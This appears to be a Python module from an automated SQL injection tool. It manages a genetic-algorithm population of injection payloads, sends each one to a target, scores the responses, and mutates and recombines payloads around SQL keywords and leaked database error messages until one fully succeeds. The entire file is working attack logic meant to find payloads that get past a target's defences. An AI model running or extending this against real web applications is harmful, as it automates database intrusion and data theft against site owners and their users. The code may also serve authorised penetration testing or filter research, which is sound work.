import random
import time
from core.mutator_ast import ASTMutator
from utils.success_validator import SuccessValidator

class IslandManager:
    def __init__(self, client, base_payloads, exp_manager, population_size=12):
        self.client = client
        self.exp_manager = exp_manager
        self.base_seeds = base_payloads
        self.population_size = population_size
        self.mutator = ASTMutator()
        self.validator = SuccessValidator()
        self.best_score_history = []
        
        # 1. Experience-Driven Initialization: Load "Golden Payloads" from memory.db
        golden_seeds = self.exp_manager.get_golden_payloads(limit=4)
        if golden_seeds:
            print(f"[*] Learning from history: Injecting {len(golden_seeds)} golden payloads into initial population.", flush=True)
            
        combined_seeds = golden_seeds + base_payloads
        
        if combined_seeds:
            sample_size = min(len(combined_seeds), self.population_size)
            self.population = random.sample(combined_seeds, sample_size)
        else:
            self.population = []

    def evolve_generation(self, gen_num):
        if not self.population:
            if self.base_seeds:
                self.population = random.sample(self.base_seeds, min(len(self.base_seeds), self.population_size))
            else:
                return None

        scored_population = []
        max_gen_score = 0
        success_count = 0
        
        # 1. Dynamic Mutation Rate: Increase intensity if progress stalls
        mutation_intensity = 1
        if len(self.best_score_history) > 3:
            if self.best_score_history[-1] <= self.best_score_history[-3]:
                mutation_intensity = 2 # Increase mutation depth
                print("[*] Progress stalled. Increasing mutation intensity...", flush=True)

        for i, payload in enumerate(self.population):
            # Simulate request
            response = self.client.send_request(payload)
            score, status = self.validator.validate(response['text'], response['status'])
            
            if score >= 0.5: success_count += 1
            
            # Error-Based Feedback: Extract SQL errors to guide mutation
            error_msg = self.validator.get_sql_error(response['text'])
            
            print(f"  [>] Testing {i+1}/{len(self.population)}: {payload[:40]}... [Score: {score} | {status}]", flush=True)
            if error_msg:
                print(f"      [!] SQL Error Detected: {error_msg}", flush=True)
            
            self.exp_manager.save_attempt(payload, score, status)
            self.mutator.report_success(score) # Awareness: Feedback to mutator
            scored_population.append((payload, score, error_msg))
            
            if score > max_gen_score:
                max_gen_score = score
            
            if score >= 1.0:
                return payload

        # 2. Dynamic Population Size Adjustment
        success_rate = success_count / len(self.population)
        progress_stalled = len(self.best_score_history) > 3 and self.best_score_history[-1] <= self.best_score_history[-3]
        
        if (progress_stalled or success_rate < 0.2) and self.population_size < 24:
            self.population_size += 2
            print(f"[*] Expanding population to {self.population_size} to explore more mutations.", flush=True)
        elif success_rate > 0.6 and max_gen_score > 0.8 and self.population_size > 8:
            self.population_size -= 2
            print(f"[*] Success rate high ({int(success_rate*100)}%). Reducing population to {self.population_size} to focus resources.", flush=True)

        self.best_score_history.append(max_gen_score)
        scored_population.sort(key=lambda x: x[1], reverse=True)
        
        # Elitism: Keep top 20% (at least 2)
        elite_count = max(2, int(self.population_size * 0.2))
        elites = [p[0] for p in scored_population[:elite_count]]
        
        # Survivors for breeding
        survivors = [p for p in scored_population if p[1] >= 0.3]
        
        self.population = self._generate_next_gen(elites, survivors, mutation_intensity)
        return None

    def _generate_next_gen(self, elites, survivors, intensity):
        next_gen = list(elites) # Start with elites
        
        if not survivors:
            return random.sample(self.base_seeds, min(len(self.base_seeds), self.population_size))

        while len(next_gen) < self.population_size:
            rand_val = random.random()
            
            if rand_val < 0.1: # 10% Chance of fresh seed
                next_gen.append(random.choice(self.base_seeds))
            elif rand_val < 0.4 and len(survivors) >= 2: # 30% Crossover
                p1, p2 = random.sample(survivors, 2)
                child = self._crossover(p1[0], p2[0])
                next_gen.append(self.mutator.mutate(child, intensity=intensity))
            else: # 60% Mutation
                parent_data = random.choice(survivors)
                parent_payload = parent_data[0]
                error_feedback = parent_data[2]
                
                # Context-Aware & Error-Based Mutation
                child = self.mutator.mutate(parent_payload, error_msg=error_feedback, intensity=intensity)
                if child not in next_gen:
                    next_gen.append(child)
        
        return next_gen

    def _crossover(self, p1, p2):
        """Combines two payloads by splitting them at a random keyword."""
        keywords = ["UNION", "SELECT", "WHERE", "AND", "OR"]
        for kw in keywords:
            if kw in p1.upper() and kw in p2.upper():
                parts1 = p1.upper().split(kw)
                parts2 = p2.upper().split(kw)
                return parts1[0] + kw + parts2[1]
        # Fallback: simple string split
        split_idx = len(p1) // 2
        return p1[:split_idx] + p2[split_idx:]
